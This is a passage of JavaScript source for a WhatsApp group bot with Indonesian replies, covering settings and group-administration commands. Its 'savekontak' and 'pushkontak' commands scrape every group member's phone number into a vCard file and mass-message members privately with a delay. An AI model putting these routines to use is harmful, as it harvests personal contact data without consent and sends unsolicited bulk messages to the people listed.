} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
m.reply("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "anticall": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
m.reply("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
m.reply("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {

if (!isOwner) return KleeReply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Anticall : ${global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Welcome : ${global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
m.reply(teks)
}
break
case "statusgc": {

if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
var anti1 = "Aktif ✅"
var anti2 = "Aktif ✅"
if (!antilink2.includes(m.chat)) anti2 = "Tidak Aktif ❌"
if (!antilink.includes(m.chat)) anti1 = "Tidak Aktif ❌"
var teks = `
*List Status Grup Settings :*

* Antilink : *${anti1}*
* AntilinkV2 : *${anti2}*

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
Klee.senText(m.chat, teks, qchanel)
}
break
case "setppgc": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (/image/g.test(mime)) {
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti *Profil* Grup")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setnamegc": case "setnamagc": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
const gcname = metadata.subject
await Klee.groupUpdateSubject(m.chat, text)
m.reply(`Berhasil Mengganti Nama Grup *${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
await Klee.groupUpdateDescription(m.chat, text)
m.reply(`Berhasil Mengganti *Deskripsi* Grup`)
}
break
case "open": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
await Klee.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
await Klee.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {

if (isGroup) {
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return KleeReply(msg.adminbot)
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return KleeReply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {

if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {

if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "add": case "addmember": {

if (!isGroup) return KleeReply(msg.group)
if (!args[0]) return m.reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await Klee.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return m.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await Klee.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {

if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Klee.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {

if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
Klee.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {

if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return m.reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
Klee.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "savekontak": {

if (!isOwner) return KleeReply(msg.owner)
if (!isGroup) return KleeReply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Klee.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await Klee.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Klee.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {

if (!isOwner) return KleeReply(msg.owner)
if (!isGroup) return KleeReply(msg.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Klee.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Klee.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await Klee.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Klee.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Klee.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak2": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await Klee.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Klee.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Klee.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {

if (!isOwner) return KleeReply(msg.owner)
if (!isGroup) return KleeReply(msg.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await Klee.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
Klee.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "joingc": case "join": {

if (!isOwner) return KleeReply(msg.owner)
if (!text && !m.quoted) return m.reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return m.reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await Klee.groupAcceptInvite(result).then(respon => m.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => m.reply(error.toString()))
}
break
case "leave": case "leavegc": {

if (!isOwner) return KleeReply(msg.owner)
if (!isGroup) return KleeReply(msg.group)
await m.reply("Otw Abangkuhh🔥")
await sleep(3000)
await Klee.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {

if (!isOwner) return KleeReply(msg.owner)
let gcall = await Object.values(await Klee.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
m.reply(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return m.reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await m.reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await Klee.groupLeave(`${gcall[leav].id}`)
}}
break
case 'about' : case 'script' : case 'sc' :{
let tet =`
> SCRIPT : KleeMD - Simple Bot WhatsApp
> Version : 2.0 [ case ]
> CREATED : FlowFalcon
> WHATSAPP : 19026088666
> TIKTOK : @flow.falcon
> GITHUB : FlowFalcon
> WEBSITE : https://www.flowfalcon.xyz
> LINK DOWNLOAD : https://www.flowfalcon.xyz/#KleeMD

 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏